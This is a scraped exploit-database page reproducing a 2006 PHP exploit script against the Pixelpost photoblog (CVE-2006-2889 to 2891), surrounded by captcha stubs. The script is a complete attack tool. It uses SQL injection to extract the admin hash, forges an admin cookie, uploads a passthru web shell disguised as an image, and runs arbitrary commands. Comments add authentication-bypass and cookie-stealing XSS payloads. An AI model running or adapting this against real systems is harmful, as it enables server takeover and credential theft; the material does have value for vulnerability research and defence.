=== Content from cxsecurity.com_e6647896_20250126_055759.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_1d08d7b4_20250125_042646.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Pixelpost <= 1-5rc1-2 multiple vulnerabilities** **2006-06-07 / 2006-06-08** Credit:  **[rgod](https://cxsecurity.com/author/rgod/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2006-2891](https://cxsecurity.com/cveshow/CVE-2006-2891/ "Click to see CVE-2006-2891")** | **[CVE-2006-2890](https://cxsecurity.com/cveshow/CVE-2006-2890/ "Click to see CVE-2006-2890")** | **[CVE-2006-2889](https://cxsecurity.com/cveshow/CVE-2006-2889/ "Click to see CVE-2006-2889")** CWE: **N/A** | | --- | |
| --- | --- | --- | --- |

#!/usr/bin/php -q -d short\_open\_tag=on
<?
echo "Pixelpost <= 1-5rc1-2 privilege escalation exploitrn";
echo "by rgod rgod (at) autistici (dot) org [email concealed]rn";
echo "site: http://retrogod.altervista.orgrn";
echo "dork: pixelpost "RSS 2.0" "ATOM feed" "Valid xHTML / Valid CSS"rnrn";
/\*
works with:
magic\_quotes\_gpc=Off
\*/
if ($argc<5) {
echo "Usage: php ".$argv[0]." host path your\_ip cmd OPTIONSrn";
echo "host: target server (ip/hostname)rn";
echo "path: path to pixelpostrn";
echo "your ip: your actual ip adress, we need it to build an admin cookiern";
echo " this is automatically set to your proxy ip if you use onern";
echo "cmd: a shell commandrn";
echo "Options:rn";
echo " -T[prefix] specify a table prefix different from "pixelpost\_"rn";
echo " -p[port]: specify a port other than 80rn";
echo " -P[ip:port]: specify a proxyrn";
echo "Examples:rn";
echo "php ".$argv[0]." a.b.c.d /pixelpost/ w.x.y.z cat ./../includes/pixelpost.phprn";
echo "php ".$argv[0]." a.b.c.d / w.x.y.z ls -la -p81rn";
echo "php ".$argv[0]." a.b.c.d / none ls -la -P1.1.1.1:80rn";
die;
}
/\* software site: http://www.pixelpost.org/
description: "A small photoblog application that's a no-brainer to set up and
use - this is truly for anyone wishing regularly to post their photos on the
web like a blog."
-----
i) sql injection in index.php near lines 670-680:
...
if($\_GET['category'] != "")
{
// Modified from Mark Lewin's hack for multiple categories
$query = mysql\_query("SELECT 1,t2.id,headline,image,datetime
FROM {$pixelpost\_db\_prefix}catassoc as t1
INNER JOIN {$pixelpost\_db\_prefix}pixelpost t2 on t2.id = t1.image\_id
WHERE t1.cat\_id = '".$\_GET['category']."'
AND (datetime<='$cdate')
ORDER BY datetime DESC");
$lookingfor = 1;
}
...
nice code, isn't it?
with magic\_quotes\_gpc = Off:
http://[target]/[path]/index.php?x=browse&category='UNION SELECT '1','2',admin,'4','5' FROM pixelpost\_config WHERE id=1/\*
http://[target]/[path]/index.php?x=browse&category='UNION SELECT '1','2',password,'4','5' FROM pixelpost\_config WHERE id=1/\*
now, at screen, you have admin username & MD5 password hash and you can build
an admin cookie:
Cookie: pp\_user=[username]; pp\_password=[sha1([md5hash].[your\_ip\_address])];
Admin can upload .php files in images/ folder, files are renamed but you can
see new filename in main index page, so... you launch commands:
http://[target]/[path]/images/20060603005716\_suntzu.php?cmd=cat%20./../i
ncludes/pixelpost.php
ii) same kind of sql injection in 'archivedate' argument at lines 681-687:
...
ELSE IF ($\_GET['archivedate'] != "")
{
$where = "AND (DATE\_FORMAT(datetime, '%Y-%m')='".$\_GET['archivedate']."')"; //DATE\_FORMAT(foo, '%Y-%m-%d')
$query = mysql\_query("SELECT 1,id,headline,image, datetime FROM ".$pixelpost\_db\_prefix."pixelpost WHERE (datetime<='$cdate') $where ORDER BY datetime desc");
$lookingfor = 1;
}
...
poc:
http://[target]/[path]/index.php?x=browse&archivedate=')%20UNION%20SELEC
T%20'1','2',password,'4','5'%20FROM%20pixelpost\_config/\*
iii)
in admin/ folder at the begin of every script, except for index.php, we have:
<?php
if(!isset($\_SESSION["pixelpost\_admin"]) || $cfgrow['password'] != $\_SESSION["pixelpost\_admin"]) {
die ("Try another day!!");
}
...
if register\_globals= On, you can easily bybass this protection, poc:
http://[target]/]path]/admin/view\_info.php?\_SESSION[pixelpost\_admin]=1&c
fgrow[password]=1
this can be used to see some interesting configuration info about target server:
http://[target]/[path]/admin/view\_info.php?\_SESSION[pixelpost\_admin]=1&c
fgrow[password]=1&view=info
or to launch XSS attacks:
http://[target]/[path]/admin/view\_info.php?\_SESSION[pixelpost\_admin]=1&c
fgrow[password]=1&view=info&admin\_lang\_pp\_exif1=<script>alert(document.c
ookie)</script>
http://[target]/[path]/admin/view\_info.php?\_SESSION[pixelpost\_admin]=1&c
fgrow[password]=1&view=info&admin\_lang\_pp\_exif2=<script>alert(document.c
ookie)</script>
http://[target]/[path]/admin/view\_info.php?\_SESSION[pixelpost\_admin]=1&c
fgrow[password]=1&view=info&admin\_lang\_pp\_path=<script>alert(document.co
okie)</script>
iv) another xss, without to be logged in:
http://[target]/[path]/admin/index.php?loginmessage="><script>window.ope
n("http://retrogod.altervista.org")</script>
\*/
error\_reporting(0);
ini\_set("max\_execution\_time",0);
ini\_set("default\_socket\_timeout",5);
function quick\_dump($string)
{
$result='';$exa='';$cont=0;
for ($i=0; $i<=strlen($string)-1; $i++)
{
if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
{$result.=" .";}
else
{$result.=" ".$string[$i];}
if (strlen(dechex(ord($string[$i])))==2)
{$exa.=" ".dechex(ord($string[$i]));}
else
{$exa.=" 0".dechex(ord($string[$i]));}
$cont++;if ($cont==15) {$cont=0; $result.="rn"; $exa.="rn";}
}
return $exa."rn".$result;
}
$proxy\_regex = '(bd{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}b)';
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy\_regex;
if ($proxy=='') {
$ock=fsockopen(gethostbyname($host),$port);
if (!$ock) {
echo 'No response from '.$host.':'.$port; die;
}
}
else {
$c = preg\_match($proxy\_regex,$proxy);
if (!$c) {
echo 'Not a valid proxy...';die;
}
$parts=explode(':',$proxy);
echo "Connecting to ".$parts[0].":".$parts[1]." proxy...rn";
$ock=fsockopen($parts[0],$parts[1]);
if (!$ock) {
echo 'No response from proxy...';die;
}
}
fputs($ock,$packet);
if ($proxy=='') {
$html='';
while (!feof($ock)) {
$html.=fgets($ock);
}
}
else {
$html='';
while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
$html.=fread($ock,1);
}
}
fclose($ock);
#debug
#echo "rn".$html;
}
function is\_hash($hash)
{
if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
else {return false;}
}
function make\_seed()
{
list($usec, $sec) = explode(' ', microtime());
return (float) $sec + ((float) $usec \* 100000);
}
$host=$argv[1];
$path=$argv[2];
$your\_ip=$argv[3];
$cmd="";$port=80;$proxy="";$table\_prefix="pixelpost\_";
for ($i=4; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P") and ($temp<>"-T"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
$port=str\_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
$proxy=str\_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
$table\_prefix=str\_replace("-T","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else
{
$p='http://'.$host.':'.$port.$path;
$temp=explode(":",$proxy);
$your\_ip=$temp[0];
}
echo "Trying sql injection in 'category' argument...rn";
$sql="'/\*\*/UNION SELECT/\*\*/'1','2',password,'4','5'/\*\*/FROM/\*\*/".$table\_prefix."config/\*\*
/WHERE/\*\*/id=1/\*";
$sql=urlencode($sql);
$packet="GET ".$p."?x=browse&category=".$sql." HTTP/1.0rn";
$packet.="Host: ".$host."rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
$temp=explode("alt="",$html);
$temp2=explode(""",$temp[1]);
$hash=trim($temp2[0]);
if (is\_hash($hash)){
echo "admin md5 password hash -> ".$hash."rn";
$sql="'/\*\*/UNION/\*\*/SELECT/\*\*/'1','2',admin,'4','5'/\*\*/FROM/\*\*/".$table\_
prefix."config/\*\*/WHERE/\*\*/id=1/\*";
$sql=urlencode($sql);
$packet="GET ".$p."?x=browse&category=".$sql." HTTP/1.0rn";
$packet.="Host: ".$host."rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
$temp=explode("alt="",$html);
$temp2=explode(""",$temp[1]);
$admin=trim($temp2[0]);
echo " " username -> ".$admin."rn";
}
else { echo "Trying with 'archivedate' argument...rn";
$sql="')/\*\*/UNION SELECT/\*\*/'1','2',password,'4','5'/\*\*/FROM/\*\*/".$table\_prefix."config/\*\*
/WHERE/\*\*/id=1/\*";
$sql=urlencode($sql);
$packet="GET ".$p."?x=browse&archivedate=".$sql." HTTP/1.0rn";
$packet.="Host: ".$host."rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
$temp=explode("alt="",$html);
$temp2=explode(""",$temp[1]);
$hash=trim($temp2[0]);
if (is\_hash($hash)){
echo "admin md5 password hash -> ".$hash."rn";
}
else {die ("Exploit failed...magic\_quotes\_gpc on here or code patched");}
$sql="')/\*\*/UNION/\*\*/SELECT/\*\*/'1','2',admin,'4','5'/\*\*/FROM/\*\*/".$table
\_prefix."config/\*\*/WHERE/\*\*/id=1/\*";
$sql=urlencode($sql);
$packet="GET ".$p."?x=browse&archivedate=".$sql." HTTP/1.0rn";
$packet.="Host: ".$host."rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
$temp=explode("alt="",$html);
$temp2=explode(""",$temp[1]);
$admin=trim($temp2[0]);
echo " " username -> ".$admin."rn";
}
$cookie="pp\_user=".$admin."; pp\_password=".sha1($hash.$your\_ip).";";
$packet="GET ".$p."admin/index.php HTTP/1.0rn";
$packet.="Host: ".$host."rn";
$packet.="Cookie: ".$cookie."rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<=count($temp); $i++)
{
$temp2=explode(" ",$temp[$i]);
$cookie.=" ".$temp2[0];
}
echo "admin cookie ->".$cookie."rn";
$shell=
'<?php
if (get\_magic\_quotes\_gpc()){$\_REQUEST["cmd"]=stripslashes($\_REQUEST["cmd"])
;}
ini\_set("max\_execution\_time",0);
error\_reporting(0);
echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
passthru($\_REQUEST["cmd"]);
echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
?>';
srand(make\_seed());
$anumber = rand(1,99999);
$my\_file="suntzu".$anumber.".php";
$data='
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="headline"
Under Costruction... - Admin.
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="category[]"
1
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="body"
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="autodate"
3
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="post\_year"
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="post\_month"
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="post\_day"
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="post\_hour"
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="post\_minute"
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="userfile"; filename="'.$my\_file.'"
Content-Type: image/jpeg
'.$shell.'
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="submit"
Upload
-----------------------------7d6318101b00a2--
';
$packet="POST ".$p."admin/index.php?x=save HTTP/1.0rn";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6318101b00a2rn";
$packet.="Host: ".$host."rn";
$packet.="Content-Length: ".strlen($data)."rn";
$packet.="Cookie: ".$cookie."rn";
$packet.="Connection: Closernrn";
$packet.=$data;
sendpacketii($packet);
$packet="GET ".$p."index.php HTTP/1.0rn";
$packet.="Host: ".$host."rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
$temp=explode("img src="",$html);
$temp2=explode(" ",$temp[1]);
for ($i=1; $i<=count($temp); $i++)
{
$temp2=explode(""",$temp[$i]);
if (eregi($my\_file,$temp2[0]))
{
$my\_path=$temp2[0];
echo "shell -> ".$my\_path."rn";
break;
}
}
$packet="GET ".$p.$my\_path." HTTP/1.0rn";
$packet.="Host: ".$host."rn";
$packet.="Cookie: cmd=".$cmd.";rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
if (strstr($html,"\*deli\*"))
{
$temp=explode("\*deli\*",$html);
die("Exploit succeeded...rn".$temp[1]);
}
else
{
echo "Failed to launch commands...";
}
?>
original url: http://retrogod.altervista.org/pixelpost\_15rc12\_xpl.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2006060067)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_452f09c4_20250126_055759.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_386b6b2b_20250126_055759.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_1cdee2e4_20250126_055800.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


